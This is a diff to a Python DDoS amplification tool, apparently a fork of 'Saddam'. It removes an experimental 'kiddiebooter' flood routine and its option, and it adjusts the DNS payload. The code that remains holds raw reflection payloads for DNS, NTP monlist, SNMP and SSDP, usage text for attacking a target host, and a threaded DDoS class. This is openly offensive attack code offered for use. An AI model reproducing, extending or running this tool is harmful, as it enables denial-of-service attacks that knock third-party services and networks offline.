@@ -6,7 +6,7 @@ import struct
 import threading
 from random import randint
 from optparse import OptionParser
-from pinject import IP, UDP, TCP
+from pinject import IP, UDP
 
 USAGE = '''
 %prog target.com [options]        # DDoS
@@ -21,8 +21,6 @@ LOGO = r'''
 	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/  /_/   /_/\__,_/____/  /_/   /_/\__,_/____/ 
 	https://github.com/OffensivePython/Saddam ~ https://github.com/merkjinx/saddam-plus-plus
 	https://twitter.com/OffensivePython
-	
-	Note there will most likely be bugs with kiddiebooter 
 '''
 
 HELP = (
@@ -30,18 +28,15 @@ HELP = (
 	'NTP Amplification file',
 	'SNMP Amplification file',
 	'SSDP Amplification file',
-	'Number of threads (default=1)',
-	'Attack port of target',
-	'Kiddiebooter user list'
+	'Number of threads (default=1)', 
+	'Attack port of target'
 )
-
 
 OPTIONS = (
 	(('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
 	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
 	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
 	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
-	(('-k', '--kiddieboot'), dict(dest='kb', metavar='FILE', help=HELP[6])),
 	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])),
 	(('-P', '--port'), dict(dest='sendingport', type=int, default=(randint(1,65535)), metavar='port', help=HELP[5])) )
 
@@ -66,17 +61,14 @@ PORT = {
 	'ssdp': 1900 }
 
 PAYLOAD = {
-	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
-			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
-			'\x00\x00\x00\x00\x00\x00'),
+	'dns': ('\xca\xf7\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01'),
 	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
 		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
 		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
 		'\x01\x02\x01\x05\x00'),
 	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
 	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'),
-	'MC':('\x10\x00\xbc\x02\x09\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x63\xdd\x02\x09\x00\x07\x6d\x65\x72\x6b\x33\x36\x30')
+		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
 }
 
 amplification = {
@@ -180,7 +172,7 @@ def Benchmark(ddos):
 		f.close()
 
 class DDoS(object):
-	def __init__(self, target, threads, domains, event, sendingport):
+	def __init__(self, target, threads, domains, event,sendingport):
 		self.target = target
 		self.threads = threads
 		self.event = event
@@ -288,20 +280,7 @@ class DDoS(object):
 		sock.close()
 		for proto in _files:
 			_files[proto][FILE_HANDLE].close()
-#def kiddiebooter(host,port): # Experimental dont use yet 
-	#totalsent=0
-	#print 'Starting....'
-	#while 1:
-		#if totalsent < 64:
-		#	print '64 Packets have been sent'
-		#	totalsent=0
-		#s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		#connect=s.connect((host,port))
-		#s.settimeout(4500) # Change me
-		#setsockopt(SOL_SOCKET., SO_SNDBUF, 5)
-		#s.send(PAYLOAD[MC])
-		#totalsent=totalsent+1
-		
+
 def main():
 	parser = OptionParser(usage=USAGE)
 	for args, kwargs in OPTIONS:
@@ -325,16 +304,10 @@ def main():
 		files['snmp'] = [options.snmp]
 	if options.ssdp:
 		files['ssdp'] = [options.ssdp]
-	if options.kb:
-		print 'Sorry kiddiebooter is unavailable at this time'
-		sys.exit()
 	if files:
 		event = threading.Event()
 		event.set()
 		if 'BENCHMARK'==args[0].upper():
-			if options.kb:
-				print 'kiddiebooter does not support benchmark at this time'
-				sys.exit()
 			ddos = DDoS(args[0], options.threads, domains, event,options.sendingport)
 			Benchmark(ddos)
 		else:
